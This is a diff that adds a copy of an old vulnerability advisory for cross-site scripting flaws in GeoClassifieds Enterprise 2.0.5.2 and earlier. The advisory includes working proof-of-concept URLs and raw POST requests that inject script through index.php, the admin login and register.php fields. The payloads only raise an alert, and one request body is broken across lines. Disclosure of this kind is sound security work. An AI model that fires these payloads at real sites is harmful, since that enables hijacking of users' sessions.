@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/19196/info
+
+GeoClassifieds Enterprise is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input. 
+
+An attacker may leverage any of these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+2.0.5.2 and prior versions are vulnerable; other versions may also be affected.
+
+http://www.example.com/index.php?a=11&b=0&c=><script>alert(/EllipsisSecurityTest/)</script>&d=5
+http://www.example.com/admin/index.php?b[username]="><script>alert(/EllipsisSecurityTest/)</script>&b[password]=1
+POST http://target.xx:80/index.php?a=10 HTTP/1.0
+Host: www.example.com 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 115
+b[username]="><script>alert(/EllipsisSecurityTest/)</script>&b[password]2=1&submit=1
+---
+POST http://www.example.com:80/register.php?b=1 HTTP/1.0
+Host: target.xx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 208
+c[firstname]=1&c[lastname]=1&c[company_name]=1&c[business_type]=1&c[business_type]=1&c[address]=1&c[address_2]=1&c[city]=
+1&c[zip]=1&c[phone]="><script>alert(/EllipsisSecurityTest/)</script>
